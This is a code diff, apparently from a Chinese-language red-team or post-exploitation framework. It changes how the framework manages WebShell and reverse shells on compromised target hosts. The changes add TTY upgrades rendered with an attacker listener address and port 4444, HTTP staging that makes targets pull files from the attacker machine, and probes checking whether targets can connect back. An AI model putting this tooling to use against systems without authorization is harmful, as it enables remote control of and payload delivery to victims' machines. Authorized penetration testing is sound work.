@@ -102,21 +102,8 @@ def _fallback(reason: str, **extra) -> JSONResponse:
 
 
 def _stage_host(db: DBSession, project_id: str, shell: Shell, sess) -> str:
-    """目标机下载时应访问的攻击机地址。
-
-    优先项目里显式配置的「攻击机网络」；未配置且目标本身是回环地址（本机联调靶）
-    时用 127.0.0.1；其余回落到基线默认值。
-    """
-    from ..models import Project
-
-    project = db.get(Project, project_id)
-    cfg = (project.settings or {}).get("attack") if project is not None else None
-    if cfg and cfg.get("ip"):
-        return str(cfg["ip"])
-    url = (getattr(shell, "url", "") or "").lower()
-    if "127.0.0.1" in url or "localhost" in url:
-        return "127.0.0.1"
-    return str((get_attack(db, project_id) or {}).get("ip") or "127.0.0.1")
+    """目标机下载时应访问的攻击机地址（实现见 service.filestage.stage_host，两处共用）。"""
+    return stage_svc.stage_host(db, project_id, shell, sess)
 
 
 def _ensure_reachable(sess) -> None:
@@ -443,16 +430,21 @@ def tty_detect(shell_id: str, db: DBSession = Depends(get_db)):
         s.stable = True
         s.alive = True
         manager.push("shell.tty", shellId=s.id, mode=mode, hasPty=True)
+
+    def _label(m: str) -> str:
+        """终端形态文案：反弹通道本身是原始交互通道，不能笼统写「WebShell 伪终端」。"""
+        if m == "full":
+            return "已固化（交互 TTY）"
+        if getattr(s, "kind", "") == "reverse":
+            return "交互通道（反弹，未固化 PTY）"
+        return "半交互（无 TTY / 无 job control）" if m == "semi" else "未固化（WebShell 伪终端）"
+
     db.commit()
-    add_event(db, project_id, "shell",
-              "终端交互能力检测：" + ("已固化（交互 TTY）" if mode == "full"
-                              else "半交互（无 TTY / 无 job control）" if mode == "semi"
-                              else "未固化（WebShell 伪终端）"),
+    add_event(db, project_id, "shell", "终端交互能力检测：" + _label(mode),
               host_id=s.host_id, detail=result["summary"])
     db.commit()
-    result["modeLabel"] = ("已固化（交互 TTY）" if mode == "full"
-                           else "半交互（无 TTY / 无 job control）" if mode == "semi"
-                           else "未固化（WebShell 伪终端）")
+    result["modeLabel"] = _label(mode)
+    result["sessionKind"] = getattr(s, "kind", "")
     return result
 
 
@@ -473,7 +465,11 @@ def tty_upgrade(shell_id: str, form: dict, db: DBSession = Depends(get_db)):
         return _fallback(f"会话不可用：{e}")
     try:
         _ensure_reachable(sess)
-        result = tty_svc.upgrade(sess, fix)
+        # 技法命令里的攻击机地址/端口按项目配置渲染（缺省 4444 = 反弹页默认监听端口）
+        from ..db import get_attack
+
+        lhost = str((get_attack(db, project_id) or {}).get("ip") or "127.0.0.1")
+        result = tty_svc.upgrade(sess, fix, lhost=lhost, lport=4444)
     except SessionError as e:
         result = {"hasPty": False, "reason": str(e), "summary": "目标不可达，技法未执行"}
 
@@ -657,18 +653,31 @@ def files_pull(shell_id: str, form: PullIn, db: DBSession = Depends(get_db)):
         raise HTTPException(400, f"base64 解码失败: {e}")
     target = form.path.rstrip("/") + "/" + form.name
     item = None
+    url = ""
     try:
         sess = _open_session(db, s)
         platform = getattr(sess, "platform", "linux")
         item = stage_svc.STAGE.add(form.name, data)
-        host = form.host.strip() or _stage_host(db, project_id, s, sess)
         port = form.port or stage_svc.STAGE.bound_port
+        primary = form.host.strip() or _stage_host(db, project_id, s, sess)
+        # 可达性预检：目标连不到就不必逐个下载工具长超时（certutil/Invoke-WebRequest 无超时参数）；
+        # 项目攻击机地址不可达时回退回环（同机联调 / 端口转发靶场）。
+        candidates = [h for h in dict.fromkeys([primary, "127.0.0.1"]) if h]
+        host = next((h for h in candidates if stage_svc.can_reach(sess, h, port)), "")
+        if not host:
+            return _fallback(f"目标机连不到攻击机 {primary}:{port}（出站受限 / 网段不通）："
+                             "请确认「全局设置」里的攻击机地址，或改走分片直传", platform=platform)
+        logs = []
+        if host != primary:
+            logs.append(f"[http] 攻击机地址 {primary} 不可达，回退用 {host}")
         url = f"http://{host}:{port}/s/{item.token}/{item.name}"
         tools = [form.tool] if form.tool else stage_svc.detect_tools(sess)
         result = stage_svc.pull_file(
             sess, url, _safe_path(target), len(data),
             platform=platform, tools=tools, timeout=form.timeout or 300.0,
+            per_timeout=form.timeout or 300.0,
         )
+        result.log[:0] = logs
     except SessionError as e:
         return _fallback(f"HTTP 拉取失败：{e}")
     finally:
@@ -689,13 +698,19 @@ def files_pull(shell_id: str, form: PullIn, db: DBSession = Depends(get_db)):
 # ---------------------------------------------------------------------------
 
 class ProbeIn(BaseModel):
-    """探测目标可覆盖（缺省用内置基线）。"""
+    """探测目标可覆盖（缺省用内置基线）。
+
+    attackIp/attackPort 有值时，ICMP/HTTP/TCP 直接探攻击机——操作者真正关心的是
+    「目标能不能回连到我这条隧道端口」，而不是「能不能上公网」。
+    """
 
     icmpHost: str = ""
     dnsName: str = ""
     httpUrl: str = ""
     tcpHost: str = ""
     tcpPort: int = 0
+    attackIp: str = ""
+    attackPort: int = 0
 
 
 @router.post("/shells/{shell_id}/probe")
@@ -703,7 +718,10 @@ def shell_probe(shell_id: str, form: ProbeIn | None = None, db: DBSession = Depe
     """真实执行四类出网探针，解析真实回显 → verdict/recommend/alt/reason。
 
     逐探针 WS 推送 probe.result；结论入时间线（前端「出网探测」弹窗消费）。
+    未显式给 attackIp 时取项目「攻击机网络」配置，保证探针回答的是回连路径问题。
     """
+    from ..db import get_attack
+
     s = _get_shell(db, shell_id)
     host = db.get(Host, s.host_id)
     try:
@@ -715,16 +733,23 @@ def shell_probe(shell_id: str, form: ProbeIn | None = None, db: DBSession = Depe
                              "reason": f"探测未执行：{e}", "probes": []})
 
     opts = {k: v for k, v in (form.model_dump() if form else {}).items() if v}
+    if not opts.get("attackIp"):
+        try:
+            opts["attackIp"] = str(get_attack(db, s.project_id).get("ip") or "")
+        except Exception:  # pragma: no cover - 配置缺失按公网基线探测
+            opts["attackIp"] = ""
     report = run_probes(sess, host_id=s.host_id, opts=opts)
 
     for p in report.probes:
         manager.push("probe.result", hostId=s.host_id, probe=p.key,
                      ok=(p.state == "ok"), ms=p.ms, evidence=p.evidence, cmd=p.cmd)
 
+    detail = (f"推荐 {report.recommend}" + (f" · 备选 {report.alt}" if report.alt else "")
+              + " · 证据 " + "; ".join(f"{p.key}={p.state}" for p in report.probes))
+    if report.warning:
+        detail = detail + " · " + report.warning
     add_event(db, s.project_id, "proxy", f"出网探测完成：{report.verdict}",
-              host_id=s.host_id,
-              detail=f"推荐 {report.recommend}" + (f" · 备选 {report.alt}" if report.alt else "")
-                     + " · 证据 " + "; ".join(f"{p.key}={p.state}" for p in report.probes))
+              host_id=s.host_id, detail=detail)
     db.commit()
     out = report.to_dict()
     out["ok"] = True
